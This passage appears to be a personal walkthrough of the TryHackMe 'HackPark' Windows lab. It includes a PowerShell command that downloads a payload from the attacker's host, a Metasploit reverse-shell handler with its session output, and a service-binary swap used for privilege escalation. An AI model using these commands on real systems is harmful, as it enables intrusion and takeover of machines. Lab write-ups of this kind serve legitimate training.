* Using the existing netcat session, transfer the file from your attack machine to the target. Use the command below replacing the <ip> with your attack machine's IP.
```bash
powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"
```
* Start Metasploit and launch the `event/multi/handler`. 
```bash
┌──(bradley㉿kali)-[~/THM/HackPark]
└─$ msfconsole
msf6 > use exploit/multi/handler
msf6 > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 > set LHOST <my-ip>
msf6 > set LPORT 4321
msf6 > exploit
listening prompt...
```
Note: The `LPORT` must match the port used in the `msfvenom` payload, and the `LHOST` should be your attack miachine's IP.
* Run the payload on the target and get a reverse shell. 
`.\my-shell.exe`

```bash
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on <my-ip>:4321 
[*] Sending stage (175174 bytes) to 10.10.152.93
[*] Meterpreter session 1 opened (<my-ip>:4321 -> 10.10.152.93:49258) at 2022-05-29 16:03:55 -0400
meterpreter > sysinfo
Computer        : HACKPARK
OS              : Windows [REDACTED].
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
```

*What is the OS version of this windows machine?* Windows [REDACTED]

Further enumerate the machine.

*What is the name of the abnormal _service_ running?* Wi[REDACTED]er

It took me a bit to land on the right service. Lots of searching. Once I got the service name, a look at the system logs showed it ran every 30 seconds as root. 

*What is the name of the binary you're supposed to exploit?* M[REDACTED].exe

*Using this abnormal service, escalate your privileges!*

That worked as follows:
* I transfered the same meterpreter payload to the proper directory.
* Startetd another meterpreter listener.
* Renamed the service.
* Renamed `my-shell.exe`.
* A reverse shell was established in meterpreter. But now as root.

*What is the user flag (on Jeffs Desktop)?* 75[REDACTED]39

*What is the root flag?* 7e[REDACTED]72


## Task 5 - Privilege Escalation Without Metasploit

In this task we will escalate our privileges without the use of meterpreter/metasploit! 

Firstly, we will pivot from our netcat session that we have established, to a more stable reverse shell.

Once we have established this we will use winPEAS to enumerate the system for potential vulnerabilities, before using this information to escalate to Administrator.  

Answer the questions below

Now we can generate a more stable shell using `msfvenom`, instead of using a `meterpreter`, This time let's set our payload to `windows/shell_reverse_tcp`  

After generating our payload we need to pull this onto the box using [powershell](https://tryhackme.com/room/powershell).  
_Tip: It's common to find C:\Windows\Temp is world writable!_  

Now you know how to pull files from your machine to the victims machine, we can pull winPEAS.bat to the system using the same method! ([You can find winPEAS here](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASbat))

WinPeas is a great tool which will enumerate the system and attempt to recommend potential vulnerabilities that we can exploit. The part we are most interested in for this room is the running processes!

_Tip: You can execute these files by using .\filename.exe_

*Using winPeas, what was the Original Install time? (This is date and time)* 8/[REDACTED]AM
